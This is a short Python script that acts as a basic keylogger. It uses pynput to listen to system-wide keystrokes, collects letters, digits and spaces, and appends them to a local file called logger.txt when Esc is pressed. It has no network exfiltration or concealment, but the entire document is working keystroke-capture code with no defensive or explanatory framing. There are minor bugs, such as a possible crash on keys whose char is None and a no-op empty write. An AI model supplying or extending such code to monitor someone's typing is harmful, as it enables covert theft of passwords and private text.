from pynput.keyboard import Key, Listener

current_word = []
def on_press(key):
    if hasattr(key,'char'):
        if key.char.isalnum() or key.char.isspace():
            current_word.append(key.char)
    elif key == Key.space:
        current_word.append(' ')

    elif key == Key.esc:
        write_to_file(current_word)
        return False
    
def write_to_file(word):
    with open("logger.txt","a") as f:
        f.write(''.join(word))
        f.write("")
with Listener(on_press = on_press) as I:
    I.join()
# write_to_file('adfa1234')
    
